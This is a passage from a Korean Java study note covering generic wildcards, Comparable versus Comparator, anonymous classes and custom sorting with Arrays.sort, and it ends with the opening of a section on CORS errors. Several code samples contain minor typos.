		Sample<? extends Number> s1 = new Sample<Integer>();

		Sample.run(new ArrayList<>());
	}
}
```

```
#)<T extends 타입> 과 <? extends U>차이점
바로 위에서 언급했듯이, 와일드 카드는 제네릭 클래스를 만들때 사용하는 것이 아니라, 
이미 만들어진 제네릭 클래스를 사용할때 타입을 지정할때 이용되는 것이다.

즉, <T extends 타입> 는 제네릭 클래스를 설계할때 적어주는 것이고, 
<? extends 타입> 는 이미 만들어진 제네릭 클래스를 인스턴스화 하여 
사용할때 타입 파라미터로 넘겨줄때 적어주는 것이다.
```

```
#)<T super 타입>은 왜 없을까
와일드카드에 <T extends 타입> 은 존재하지만, <T super 타입> 은 없는 걸 볼 수 있다. 
<T extends 타입> 는 정의할 제네릭 타입 범위를 상한 제한하기 위해 사용하는데, 
<T super 타입> 이 된다면 무수히 많은 자바의 클래스와 인터페이스가 올 수 있다는 뜻이기 때문에, 
Object와 다르지 않아 그냥 쓸모없는 코드이기 때문이다. 
```

```
#) <?>와 <Object>는 다르다
비경계 와일드카드가 모든 타입이 들어올 수 있으니 Object와 다를바 없다고 말할수 있겠지만, 
엄밀히 List<?> 와 List<Object> 는 다른 놈이다. 

왜냐하면  List<Object>에는 Object의 하위 타입은 모두 넣을 수 있지만, 
List<?> 에는 오직 null만 넣을 수 있기 때문이다. (잘 모르면 위로 올라가 다시 복습하자!)
이는 타입 안정성을 지키기 위한 제네릭의 특성으로, 
만약 다음과 같이 List<?>에 모든 타입을 넣을 수 있게 한다면, 
List<Integer>에 Double형을 추가하는 모순 발생하게 되어서 그렇다.

public static void main(String[] args) {
	List<Integer> ints = new ArrayList<>();
	add(ints);
}

private static void add(List<?> ints){
	ints.add(3.14); // 외부에서 받은 List<Integer>에 Double을 추가하는 모순 발생
}

```

```
#)compareTo()
- 문자열의 사전순 값을 비교하여 그에 해당되는 int값을 리턴

A = A 인경우 0을 반환
A > B 인경우 1을 반환
A < B 인경우 -1을 반환

public void test() {
	String str1 = "AA";
	String str2 = "AA";
	String str3 = "BB";
	System.out.println(str1.compareTo(str2)); //결과 0
	System.out.println(str1.compareTo(str3)); //결과 -1
	System.out.println(str3.compareTo(str2)); //결과 1
}


#)compare() 메서드
- Comparator 인터페이스를 구현할 때 작성해야하는 메서드
실제로 구현할 때 compare()에 2개의 인자를 넘겨 내부에 구현에 따라 int 결과값을 리턴한다.

@Override
public int compare(인자1,인자2) {
	if(인자1 > 인자2) {
		return 1;
	}else if(인자1 < 인자2) {
		return -1;
	}else {
		return 0;
	}
}
```

```
#)Comparable, Comparator의 차이
Comparable은 자기자신과 매개변수 객체를 비교
Comparator는 두 매개변수 객체를 비교

또 다른 차이점은, Comparable은 lang패키지에 있기때문에 import를 해줄필요가 없지만,
Comparator는 util패키지에 있다.
```
```
#)Comparable (자기자신과 매개변수객체를 비교)
class Student implements Comparable<Student> {
	int age;
	int classNumber; //학급

	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber;
	}

	//비교구현작성(매개변수인 o와 자기자신과비교)
	@Override
	public int compareTo(Student o) {}
}


//이제 compareTo 메서드를 구현해보자.
만약 나이를 기준으로 비교하면
자기자신의 나이와 매개변수로 들어온 o객체의 나이를 비교하면 된다.

class Student implements Comparable<Student> {
	int age;
	int classNumber;

	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber
	}

	@Override
	public int compareTo(Student o) {
		//자기자신의 age가 o의 age보다 크다면 양수
		if(this.age > o.age) {
			return 1;
		}
		else if(this.age == o.age) {
			return 0;
		}
		else{
			return -1;
		}
		
	}
}
```

```
위의 방식에서 좀 더 생각해보면 0,1,-1을 반환 할 수도 있지만,
그냥 두 비교대상의 값 차이를 반환해도 되지 않겠는가?

class Student implements Comparable<Student> {
	int age;
	int classNumber;

	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber;
	}

	@Override
	public int compareTo(Student o) {
		return this.age - o.age;  //자기자신이크면 양수반환 할 것이다.
	}
}

//위에처럼 작성 시 코드가 간단해진다.
```

```
#)Comparator (두 매개변수 객체를 비교)
class Student implements Comparator<Student> {
	int age;
	int classNumber;

	Student(int age, int classNumber) {
		this.age;
		this.classNumber = classNumber;
	}

	@Override
	public int compare(Student o1, Student o2) {
		//o1의 학급이 o2의 학급보다 크다면 양수
		if(o1.classNumber > o2.classNumber) {
			return 1;
		}else if(o1.classNumber == o2.classNumber) {
			return 0;
		}else {
			return -1;
		}
	}
}


//위를 간단하게 표기
class Student implements Comparator<Student> {
	int age;
	int classNumber;

	Student(int age, int classNumber) {
		this.age;
		this.classNumber = classNumber;
	}

	@Override
	public int compare(Student o1, Student o2) {
		return o1.classNumber - o2.classNumber
	}
}
```
```
#)그러면 위에 있는 클래스를 활용해서 호출하는 것까지 만들어보자
public class Test {
	public static void main(String[] args) {
		Student a = new Student(17,2); //17살 2반
		Student b = new Student(18,1); //18살 1반
		Student c = new Student(15,3); //15살 3반

		//a 객체와는 상관없이 b와 c객체를 비교한다.
		int isBig = a.compare(b,c);

		if(isBig > 0) {
			//b객체가 c객체보다 큽니다.
		}else if(isBig == 0) {
		}else{

		}

	}
}

class Student implements Comparator<Student> {
	int age;
	int classNumber;

	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber;
	}
	@Override
	public int compare(Student o1, Student o2) {
		return o1.classNumber - o2.classNumber; 
	}
}

//a.compare(b,c) 이렇게 비교하지만 a객체와는 관련없이 두 객체의 비교값을 반환하게 되는것이다.
```

```
만약에 a.compare 메소드에서 a와 비교하고 싶다면 아래처럼 해주면 된다.
a.compare(a,b)

그리고 위 예시처럼 수의 범위를 넘어가지 않을 때는 
return o1.classNumber - o2.classNumber로 해주어도 되지만,
만약 오버플로우가 발생하면 결과가 다르다.

//아래처럼 b에 Integer.MIN_VALUE 선언
public class Test {
	public static void main(String[] args)  {
 
		Student a = new Student(17, 2);					// 17살 2반
		Student b = new Student(18, Integer.MIN_VALUE);	// 18살 -2,147,483,648반
		Student c = new Student(15, 3);					// 15살 3반
			
		// a객체와는 상관 없이 b와 c객체를 비교한다.
		int isBig = a.compare(b, c);
		
		if(isBig > 0) {
			System.out.println("b객체가 c객체보다 큽니다.");
		}
		else if(isBig == 0) {
			System.out.println("두 객체의 크기가 같습니다.");
		}
		else {
			System.out.println("b객체가 c객체보다 작습니다.");
		}
		
	}
}
 
class Student implements Comparator<Student> {
 
	int age;			// 나이
	int classNumber;	// 학급
	
	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber;
	}
	
	@Override
	public int compare(Student o1, Student o2) {
		return o1.classNumber - o2.classNumber;
	}
}

//결과 : b객체가 c객체보다 더큰것으로 판단해버린다.\
```
```
#)반대로 Integer.MAX_VALUE도 마찬가지이다. c객체에 음수를 넣고

import java.util.Comparator;
 
public class Test {
	public static void main(String[] args)  {
 
		Student a = new Student(17, 2);					// 17살 2반
		Student b = new Student(18, Integer.MAX_VALUE);	// 18살 2,147,483,647반
		Student c = new Student(15, -3);					// 15살 -3반
			
		// a객체와는 상관 없이 b와 c객체를 비교한다.
		int isBig = a.compare(b, c);
		
		if(isBig > 0) {
			System.out.println("b객체가 c객체보다 큽니다.");
		}
		else if(isBig == 0) {
			System.out.println("두 객체의 크기가 같습니다.");
		}
		else {
			System.out.println("b객체가 c객체보다 작습니다.");
		}
		
	}
}
 
class Student implements Comparator<Student> {
 
	int age;			// 나이
	int classNumber;	// 학급
	
	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber;
	}
	
	@Override
	public int compare(Student o1, Student o2) {
		return o1.classNumber - o2.classNumber;
	}
}

//결과: b객체가 c객체보다 작습니다.

```
```
#)Comparator 활용편
위에서 보았듯이 Comparator를 통해 compare메소드를 사용하려면 결국에는 
compare메소드를 활용하기 위한 객체가 필요하게 된다.

무슨말이냐면, a,b,c,객체가 생성되어있고, 이들을 비교하고 싶다면 어느 한 객체를 통해 compare메소드를 사용해야한다는것이다.

즉, 다음과 같은 상황이 온다.

public class Test {
	public static void main(String[] args) {
		Student a = new Student(17,2);
		Student b = new Student(18,1);
		Student c = new Student(15,3);

		//이렇게 a이건,b이건,c이건 어떤객체를 호출하던 상관이 없게된다.
		//즉, 일관성이 없어진다.
		int isBig = a.compare(a,b);
		int isBig2 = a.compare(b,c);
		int isBig3 = a.compare(a,c);
	}
}
```

```
#)물론 비교만을 위해 Student 객체를 하나더 생성해주는 방법이 있다.
public class Test {
	public static void main(String[] args) {
		Student a = new Student(17,2);
		Student b = new Student(18.1);
		Student c = new Student(15,3);
		Student comp = new Student(0,0); //비교만을 위해 사용할 객체

		int isBig = comp.compare(a,b);
		int isBig2 = comp.compare(b,c);
		int isBig3 = comp.compare(a,c);
	}
}

하지만 위처럼 하면 우리가 Student클래스에서 변수로 두고있던 
comp 클래스의 age와 classNumber변수는 쓸모가없다.

즉, 우리가 원하는것은 Comparator 비교 기능만 따로 두고싶다.
```

```
그럼 Comparator 기능만 따로 두고 싶다면 
익명객체(클래스)를 활용한다.

익명객체란?
우리가 클래스를 생성할 때 class 키워드 다음에 이름을 정의했다.
하지만, 이름없이 class를 정의할 수 있는가? 불가능하다

하지만, 우리의 고민처럼 특정 구현 부분만 따로 사용한다거나, 
부분적으로 기능을 일시적으로 바꿔야 할 경우가 생길 때가 있다. 
이럴 때 사용할 수 있는 것이 바로 익명객체인데, 일단 코드를 먼저 보도록 하자.

public class Anonymous {
	public static void main(String[] args) {
	
		Rectangle a = new Rectangle();
		
		// 익명 객체 1 (쉽게 Rectangle를 상속받았다고 생각)
		Rectangle anonymous1 = new Rectangle() {
		
			@Override
			int get() {
				return width;
			}
		};
		
		System.out.println(a.get());
		System.out.println(anonymous1.get());
		System.out.println(anonymous2.get());
	}
	
	// 익명 객체 2(static으로 써도 Rectangle 가능하다)
	static Rectangle anonymous2 = new Rectangle() {
		
		int depth = 30;
		@Override
		int get() {
			return width * height * depth;
		}
	};
}
 
class Rectangle {
	
	int width = 10;
	int height = 20;
	
	int get() {	
		return height;
	}
}
```
```
이름이 Rectangle이 아닌가요 라고 생각할 수 있지만 아니다. 일단 아래 익명을 쓰지 않은 클래스보자

public class Anonymous {
	public static void main(String[] args) {
 
		Rectangle a = new Rectangle();
		ChildRectangle child = new ChildRectangle();
 
		System.out.println(a.get());		// 20
		System.out.println(child.get());	// 10 * 20 * 40
	}
}
 
class ChildRectangle extends Rectangle {
	
	int depth = 40;
	
	@Override
	int get() {
		return width * height * depth;
	}
}
 
class Rectangle {
 
	int width = 10;
	int height = 20;
 
	int get() {
		return height;
	}
}
//위의 각 클래스는 a와 child란 변수명으로 객체를 담고있다.
```
```
//이제 익명객체를 사용한 코드를 한 번 보자
public class Anonymous {
	public static void main(String[] args) {
		Rectangle a = new Rectangle();

		//Rectangle를 상속받은것처럼 
		Rectangle anonymous = new Rectangle() {
			int depth = 40;
			@Override
			int get() {
				return width * height * depth;
			}
		};
		System.out.println(a.get()); //20
		System.out.println(anonymous.get()); //10*20*40
	}
}
class Rectangle {
	int width = 10;
	int height = 20;

	int get() {
		return height;
	}
}
//익명개체부분을 보면 Rectangle을 상속받아 ChildRectangle 클래스를 만든 것과 같지만,
이 코드는 이름이 정의되어 있지 않고, anonymous라는 이름으로 객체만 생성되어 있다.

이렇게 클래스 이름으로 정의되지 않는 객체를 익명객체라 하는 것이다.

이는 거꾸로 말하면, 이름이 정의되지 않기 때문에 특정 타입이 존재하는 것이 아니기 때문에 
반드시 익명 객체의 경우는 상속할 대상이 있어야 한다는 것이다.

이 때, 상속이라 함은 class의 extends 뿐만 아니라 interface의 implements 또한 마찬가지다.

public class Anonymous {
	public static void main(String[] args) {
		Rectangle a = new Rectangle();

		Shape anonymous = new Shape() {
			int depth = 40;

			@Override
			public int get() {
				return width * height * depth;
			}
		};
		System.out.println(a.get()); //Shape 인터페이스를 구현한 Rectangle
		System.out.println(anonymous.get()); // Shape 인터페이스를 구현한 익명객체
	}
}
class Rectangle implements Shape {
	int depth = 40;

	@Override
	public int get() {
		return width * height * depth;
	}
}

interface Shape {
	int width = 10;
	int height = 20;

	int get();
}
```
```
이제 본론으로 들어가서
우리가 원하는 건 Comparator의 기능만 사용하고 싶은 것이다.
즉, Comparator의 구현을 통해 compare만 사용하고 싶은것이라는 뜻이다.

분명히 Comparator라는 interface는 존재한다. 
이는 구현(상속)할 대상이 존재한다는 것이다. 이는 익명객체로 만들 수 있다는 것이다.

즉, 이름은 정의 되지 않지만, Comparator을 구현하는 익명객체를 생성하면 되는 것이다.
이 때, Comparator 구현은 이 전에 class Student implements Comparator { ... } 에서 구현했던 방식을 그대로 차용하면 된다.

public class Test {
	public static void main(String[] args) {
		//익명객체구현 방법 1
		//인터페이스(Comparator) 자체만으로는 객체가 생성안된다
		Comparator<Student> comp1 = new Comparator<Student>(); //에러가난다.
		

		//그래서 익명객체구현으로 한다.
		Comparator<Student> comp1 = new Comparator<Student>() {
			@Override
			public int compare(Student o1, Student o2) {
				return o1.classNumber - o2.classNumber;
			}
		};
	}

	//익명객체구현2
	public static Comparator<Student> comp2 = new Comparator<Student>() {
		@Override
		public int compare(Student o1, Student o2) {
			return o1.classNumber - o2.classNumber;
		};
	}
}

//외부에서 익명객체로 Comparator가 생성되기 때문에 클래스에서 Comparator를 구현할 필요가 없어진다.
class Student {
	int age;
	int classNumber;

	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber;
	}
}
```
```
//위에서 처럼 익명객체의 경우 필요에 따라 main함수밖에 정적(static)타입으로 선언해도되고,
main안에 지역변수처럼 non-static으로 생성해도된다.

일단 static방식으로 설명

자. 이렇게 외부에서 Comparator을 구현하는 익명객체가 생성되었기 때문에, 
Student 클래스 내부에서 우린 Comparator을 구현해줄 필요가 없어졌다.

즉, 이 전에 a.compare(b, c) 이런식이 아니라, 
위에서 생성한 익명객체를 가리키는 comp 를 통해 comp.compare(b, c) 이런 식으로 해주면 된다는 것이다.

한 번 테스트를 해보자.

import java.util.Comparator;
 
public class Test {
	public static void main(String[] args)  {
 
		Student a = new Student(17, 2);	// 17살 2반
		Student b = new Student(18, 1);	// 18살 1반
		Student c = new Student(15, 3);	// 15살 3반
			
		// comp 익명객체를 통해 b와 c객체를 비교한다.
		int isBig = comp.compare(b, c);
		
		if(isBig > 0) {
			System.out.println("b객체가 c객체보다 큽니다.");
		}
		else if(isBig == 0) {
			System.out.println("두 객체의 크기가 같습니다.");
		}
		else {
			System.out.println("b객체가 c객체보다 작습니다.");
		}
		
	}
	
	public static Comparator<Student> comp = new Comparator<Student>() {
		@Override
		public int compare(Student o1, Student o2) {
			return o1.classNumber - o2.classNumber;
		}
	};
}
 
class Student {
 
	int age;			// 나이
	int classNumber;	// 학급
	
	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber;
	}
	
}

```
```
또, 익명객체를 사용하면 좋은 점이 하나 더 있다.

익명객체는 이름이 정의되지 않은 하나의 새로운 클래스인데
우리가 클래스를 상속(구현)할때, 이름만 다르게하면 몇 개던 여러개를 생성할 수 있듯이
익명객체 또한 마찬가지이다. 다만, 이름이 없을뿐이다.

즉, 익명 객체를 가리키는 변수명만 달리하면 몇 개든 자유롭게 생성할 수 있다. 
위 예제에서는 학급을 기준으로 대소 비교를 했지만, 
만약 나이를 기준으로도 대소 비교를 하고 싶다면 다음과 같이 하나의 또다른 익명 객체를 생성 할 수 있다는 것이다.

import java.util.Comparator;
 
public class Test {
	public static void main(String[] args)  {
 
		Student a = new Student(17, 2);	// 17살 2반
		Student b = new Student(18, 1);	// 18살 1반
		Student c = new Student(15, 3);	// 15살 3반
			
		// 학급 기준 익명객체를 통해 b와 c객체를 비교한다.
		int classBig = comp.compare(b, c);
		
		if(classBig > 0) {
			System.out.println("b객체가 c객체보다 큽니다.");
		}
		else if(classBig == 0) {
			System.out.println("두 객체의 크기가 같습니다.");
		}
		else {
			System.out.println("b객체가 c객체보다 작습니다.");
		}
		
		// 나이 기준 익명객체를 통해 b와 c객체를 비교한다.
		int ageBig = comp2.compare(b, c);
		
		if(ageBig > 0) {
			System.out.println("b객체가 c객체보다 큽니다.");
		}
		else if(ageBig == 0) {
			System.out.println("두 객체의 크기가 같습니다.");
		}
		else {
			System.out.println("b객체가 c객체보다 작습니다.");
		}
		
	}
	
	// 학급 대소 비교 익명 객체
	public static Comparator<Student> comp = new Comparator<Student>() {
		@Override
		public int compare(Student o1, Student o2) {
			return o1.classNumber - o2.classNumber;
		}
	};
	
	// 나이 대소 비교 익명 객체
	public static Comparator<Student> comp2 = new Comparator<Student>() {
		@Override
		public int compare(Student o1, Student o2) {
			return o1.age - o2.age;
		}
	};
}
 
class Student {
 
	int age;			// 나이
	int classNumber;	// 학급
	
	Student(int age, int classNumber) {
		this.age = age;
		this.classNumber = classNumber;
	}	
}
//즉, 익명객체를 통해 여러가지 비교 기준을 정의할 수 있다는 것이 큰 장점이다.
```
```
Comparable도 익명객체로 선언가능은 하지만 인자를 하나만 받기 떄문에 의미없다.

#)Comparable, Comparator 정렬
자바에서의 정렬은 기본으로 오름차순을 기준으로 한다.
우리가 흔히 쓰는 Arrays.sort(), COllections.sort() 모두 오름차순을 기준으로 정렬된다.

즉, return o1 - o2 를 한다면 음수가 나오면 뒷수가 크다는 것이니까 오름차순에 맞다.

즉, compare 혹은 compareTo를 사용하여 객체를 비교할 경우 음수가 나오면
두 원소의 위치를 바꾸지 않는다는 것이다.

[규칙결정]
- 음수일 경우 : 두 원소의 위치를 교환 안함
- 양수일 경우 : 두 원소의 위치를 교환 함

정렬을 구현해보면 알겠지만 Counting Sort 같은 특수한 경우를 제외하고 
Insertion, Quick, Merge 등 다양한 정렬 알고리즘은 
'두 데이터(요소)의 비교'를 통해 두 원소를 교환할지 말지를 정하게 된다.

앞서 primitive type의 경우 이미 대소 비교가 가능하지만, 
객체를 정렬하고자 한다면 너무나 당연히도 두 요소를 비교하기 위해서는 
Comparable을 통한 compareTo() 혹은, Comparator을 통한 compare() 메소드를 활용하여 
두 객체의 대소 비교를 한다는 것이다.
```
```
예를 들어
public class Test {
	public static void main(String[] args) {
		MyInteger[] = arr = new MyInteger[10];

		//객체 배열 초기화 랜덤으로
		for(int i = 0; i<10; i++) {
			arr[i] = new MyInteger((int)(Math.random()*100));
		}
	}
}
class MyInteger implements Comparable<MyInteger>{
	int value;

	public MyInteger(int value) {
		this.value = value;
	}

	//자기 자신의 value를 기준으로 파라미터 값과의 차이를 반환한다.
	@Override
	public int compareTo(MyInteger o) {
		return this.value - o.value;
	}
}
```
```
그럼 이제, Arrays.sort() 메소드에 한번 테스트해보자

package byteLength;

import java.util.Arrays;

public class Test1 {
	public static void main(String[] args) {
		MyInteger[] arr = new MyInteger[10];
		
		for(int i = 0; i<10; i++) {
			arr[i] = new MyInteger((int)(Math.random() * 100));
		}
		
		//정렬이전
		for(int i = 0; i<10; i++) {
			System.out.print(arr[i].value + " ");
		}
		System.out.println();
		
		Arrays.sort(arr);
		
		//정렬이후
		for(int i = 0; i < 10; i++) {
			System.out.print(arr[i].value + " ");
		}
		System.out.println();
	}
}

class MyInteger implements Comparable<MyInteger> {
	int value;
	
	public MyInteger(int value) {
		this.value = value;
	}
	@Override
	public int compareTo(MyInteger o) {
		return this.value - o.value;
	}
}
//중요한것은 Comparable을 구현하지 않고 그냥 정렬하면(Arrays.sort) 에러가 난다.

테스트를 해보니 Integer[]도 내부적으로 implements Comparable<Integer> 로 선언되있어서 아래처럼 가능했던것이다.

package byteLength;

import java.util.Arrays;

public class Test1 {
	public static void main(String[] args) {
		Integer[] arr = new Integer[10];
		
		for(int i = 0; i<10; i++) {
			arr[i] = new Integer((int)(Math.random() * 100));
		}
		
		//정렬이전
		for(int i = 0; i<10; i++) {
			System.out.print(arr[i]+ " ");
		}
		System.out.println();
		
		Arrays.sort(arr);
		
		//정렬이후
		for(int i = 0; i < 10; i++) {
			System.out.print(arr[i]+ " ");
		}
		System.out.println();
	}
}

```
```
만약 Comparable 대신 Comparator을 쓴다면 어떻게 해야할까?

import java.util.Arrays;
import java.util.Comparator;
 
public class Test {
	
	public static void main(String[] args) {
		
		MyInteger[] arr = new MyInteger[10];
		
		// 객체 배열 초기화 (랜덤 값으로) 
		for(int i = 0; i < 10; i++) {
			arr[i] = new MyInteger((int)(Math.random() * 100));
		}
	}
 
	
	static Comparator<MyInteger> comp = new Comparator<MyInteger>() {
		
		@Override
		public int compare(MyInteger o1, MyInteger o2) {
			return o1.value - o2.value;
		}
	};
}
 
 
class MyInteger {
	int value;
	
	public MyInteger(int value) {
		this.value = value;
	}
	
}
//그럼 이제, 우리가 만든 comp 기준을 이용하여 Arrays.sort에 인자로 어떻게 넣지?.. 
Arrays.sort는 단순히 배열만 파라미터로 받는게 아니라 Comparator 또한 파라미터로 받는다.

실제로 Arrays 클래스 안에 보면 sort 메서드가 여러개있는데 그 중하나가
public static <T> void sort(T[] a, Comparator<? super T> c) 가 있다.

즉, Comparator 파라미터로 넘어온 c의 비교기준을 갖고 파라미터로 넘어온 객체배열 a를 정렬하겠다.

우리가 그동안 Arrays.sort()를 쓸 때 Arrays.sort(array); 이런식으로 배열만 넘겨주었지만 
사실은 Comparator로 구현된 객체를 파라미터로 같이 넘겨주어 Arrays.sort(array, comp); 로도 쓸 수 있다는 것이다.


즉, 우리가 구현한 Comparator 익명객체를 이용하여 정렬을 하고싶다면 아래와 같이 작성을 해주면 된다는 것이다.

import java.util.Arrays;
import java.util.Comparator;
 
public class Test {
	
	public static void main(String[] args) {
		
		MyInteger[] arr = new MyInteger[10];
		
		// 객체 배열 초기화 (랜덤 값으로) 
		for(int i = 0; i < 10; i++) {
			arr[i] = new MyInteger((int)(Math.random() * 100));
		}
 
		// 정렬 이전
		System.out.print("정렬 전 : ");
		for(int i = 0; i < 10; i++) {
			System.out.print(arr[i].value + " ");
		}
		System.out.println();
		
		Arrays.sort(arr, comp);		// MyInteger에 대한 Comparator을 구현한 익명객체를 넘겨줌
        
		// 정렬 이후
		System.out.print("정렬 후 : ");
		for(int i = 0; i < 10; i++) {
			System.out.print(arr[i].value + " ");
		}
		System.out.println();
	}
 
	
	static Comparator<MyInteger> comp = new Comparator<MyInteger>() {
		
		@Override
		public int compare(MyInteger o1, MyInteger o2) {
			return o1.value - o2.value;
		}
	};
}
 
 
class MyInteger {
	int value;
	
	public MyInteger(int value) {
		this.value = value;
	}
}
```
```
//위에서 sort 메서드에서 Arrays.sort(Object[] a)와 Arrays.sort(T[] a, Comparator<? super T> c) 의 차이
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/71.PNG" width="650" height="300" /><br><br>

```
근데, 만약 내림차순으로 하고싶다면?
오름차순에서는 음수면 교환 안한다고했으니 똑같이 하되 인자만 순서 체인지해주면 된다.  

#)Comparable
import java.util.Arrays;
import java.util.Comparator;
 
public class Test {
	
	public static void main(String[] args) {
		
		MyInteger[] arr = new MyInteger[10];
		
		// 객체 배열 초기화 (랜덤 값으로) 
		for(int i = 0; i < 10; i++) {
			arr[i] = new MyInteger((int)(Math.random() * 100));
		}
 
		// 정렬 이전
		System.out.print("정렬 전 : ");
		for(int i = 0; i < 10; i++) {
			System.out.print(arr[i].value + " ");
		}
		System.out.println();
		
		Arrays.sort(arr);		// MyInteger에 대한 Comparable을 사용하여 정렬
        
		// 정렬 이후
		System.out.print("정렬 후 : ");
		for(int i = 0; i < 10; i++) {
			System.out.print(arr[i].value + " ");
		}
		System.out.println();
	}
}
 
 
class MyInteger implements Comparable<MyInteger> {
	int value;
	
	public MyInteger(int value) {
		this.value = value;
	}
	
	@Override
	public int compareTo(MyInteger o) {
		return o.value - this.value; //이게차이점이다. 
	}
	
}

```

```
#)Comparator(내림차순)
import java.util.Arrays;
import java.util.Comparator;
 
public class Test {
	
	public static void main(String[] args) {
		
		MyInteger[] arr = new MyInteger[10];
		
		// 객체 배열 초기화 (랜덤 값으로) 
		for(int i = 0; i < 10; i++) {
			arr[i] = new MyInteger((int)(Math.random() * 100));
		}
 
		// 정렬 이전
		System.out.print("정렬 전 : ");
		for(int i = 0; i < 10; i++) {
			System.out.print(arr[i].value + " ");
		}
		System.out.println();
		
		Arrays.sort(arr, comp);		// MyInteger에 대한 Comparator을 구현한 익명객체를 넘겨줌
        
		// 정렬 이후
		System.out.print("정렬 후 : ");
		for(int i = 0; i < 10; i++) {
			System.out.print(arr[i].value + " ");
		}
		System.out.println();
	}
 
	
	static Comparator<MyInteger> comp = new Comparator<MyInteger>() {
		
		@Override
		public int compare(MyInteger o1, MyInteger o2) {
			return o2.value-  o1.value;
		}
	};
}
 
 
class MyInteger {
	int value;
	
	public MyInteger(int value) {
		this.value = value;
	}
	
	
}

```

```
 

보면 알겠지만, 
Comparator는 익명객체로 여러개를 생성할 수 있지만, Comparable의 경우 compareTo 하나 밖에 구현할 수 없다.

그렇다보니, 
보통은 Comparable은 여러분이 비교하고자 하는 가장 기본적인 설정(보통은 오름차순)으로 구현하는 경우가 많고, 
Comparator는 여러개를 생성할 수 있다보니 특별한 정렬을 원할 때 많이 쓰인다.

 

쉽게 말해 Comparable은 기본(default) 순서를 정의하는데 사용되며, 
Comparator은 특별한(specific) 기준의 순서를 정의할 때 사용된다는 것이다.

이를 이용하여 다음과 같이 복합적으로도 구현 하여 각기 다른 정렬을 할 수도 있다.

public class Test {
	public static void main(String[] args) {
		Student[] arr = new Student[9];

		arr[0] = new Student(3, 70);	// 3반 70점
		arr[1] = new Student(1, 70);	// 1반 70점
		arr[2] = new Student(1, 50);	// 1반 50점
		arr[3] = new Student(2, 60);	// 2반 60점
		arr[4] = new Student(2, 80);	// 2반 80점
		arr[5] = new Student(1, 30);	// 1반 30점
		arr[6] = new Student(2, 70);	// 2반 70점
		arr[7] = new Student(3, 90);	// 3반 90점
		arr[8] = new Student(3, 60);	// 3반 60점

		//객체복사
		Student[] arr2 = arr.clone();
		Student[] arr3 = arr.clone();

		//학급으로 오름차순 정렬 후 같으면 성적으로 내림차순을 만들려고 한다.
		System.out.println("(c,s) -> (classNum, score)");

		//정렬이전
		for(Student v : arr) {
			System.out.print(v);
		}

		//Student클래스에 구현해놨음 compareTo 함수
		Arrays.sort(arr); //Comparable 사용
		
		System.out.print("\n학급 오름차순 정렬(같을 경우 성적 내리차순) : ");
		
		for(Student v : arr) { //정렬 후 출력
			System.out.print(v);
		}

		-----------------
		 
		Arrays.sort(arr2,comp1); //Comparator 사용
		
		System.out.print("\n학급 오름차순 정렬(같을경우 성적 오름차순) : ");
		for(Student v : arr2) {
			System.out.print(v);
		}

		Arrays.sort(arr3)

		--------------------
		
		Arrays.sort(arr3,comp2); //Comparator 사용
		
		System.out.print("\n성적 내림차순 정렬(같을 경우 학급 오름차순) : ");
		for(Student : arr3) {
			System.out.print(v);
		}
		System.out.println();
	}

	static Comparator<Student> comp1 = new Comparator<Student>() {
		@Override
		public int compare(Student o1, Student o2) {
			//만약 학급이 같다면 성적을 기준으로 오름차순으로 정렬
			if(o1.classNum == o2.classNum) {
				return o1.score - o2.score
			}
			return o1.classNum - o2.classNum; //학급 기준으로 오름차순
		}
	};

	static Comparator<Student> comp2 = new Comparator<Student>() {
		@Override
		public int compare(Student o1, Student o2) {
			//만약 성적이 같다면 학급을 오름차순으로 정렬
			if(o1.score == o2.score) {
				return o1.classNum - o2.classNum;
			}
			return o2.score - o1.score; //성적을 내림차순으로 정렬
		}
	};
}

class Student implements Comparable<Student> {
 
	int classNum;
	int score;
	
	public Student(int classNum, int score) {
		this.classNum = classNum;
		this.score = score;
	}
	
	@Override
	public int compareTo(Student o) {
		
		// 만약 학급이 같다면 성적을 기준으로 "내림차순"으로 정렬한다.
		if(this.classNum == o.classNum) {
			return o.score - this.score;
		}
		return this.classNum - o.classNum;	// 학급 기준 오름차순으로 정렬한다.
	}
	
	
	@Override
	public String toString() {
		return "("+classNum + ", " + score + ")  ";
	}
}
```
```
참고로 여러분이 쓰는 String의 경우 두 String간의 문자열 비교를 위해 compareTo()를 썼을 것이다. 
이 메소드가 가능했던 이유가 바로 
String 클래스에 Comparable을 implements하여 compareTo() 메소드를 구현하고 있기 때문에 그렇다.
```

```
#)CORS(Cross Origin Resource Sharing) 에러
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/72.PNG" width="650" height="300" /><br><br>

```
#)요청방식에 따라 다른 CORS 발생여부
1. <img>, <video>, <script>, <link> 태그등
-> 기본적으로 Cross-Origin 정책을 지원함

- <link> 태그의 href에서 다른사이트의 .css 리소스에 접근하는 것이 가능
- <img> 태그의 src에서 다른 사이트의 .png, .jpg 등의 리소스에 접근하는 것이 가능
- <script> 태그의 src에서 다른 사이트의 .js 리소스에 접근하는 것이 가능(type="module" 속성은 제외)

2. XMLHttpRequest, FetchAPI 스크립트
-> 기본적으로 Same-Origin 정책을 따름
- 다른 도메인의 소스에 대해 자바스크립트 ajax 요청 API 호출 시
- 웹 폰트 css파일 내 @font-face에서 다른 도메인의 폰트 사용 시

자바스크립트에서의 요청은 기본적으로 서로 다른 도메인에 대한 요청을 보안상 제한한다. 
브라우저는 기본으로 하나의 서버 연결만 허용되도록 설정되어 있기 때문이다. (주로 자신의 서버)
 
처음 보는 용어가 나온다. 
Same Origin 정책과 Cross Origin 정책이란 대체 무슨 정책(Policy)을 말하는 것일까? 

이러한 정책들이 뭐길래 웹 브라우저가 외부 리소스를 가려서 받는 것일까?  
바로 이 Same Origin / Cross Origin 정책의 정보 부족으로 인해 
나도모르게 정책을 위반하는 행동을 하게 되어 CORS 에러가 나타나는 것이다. 

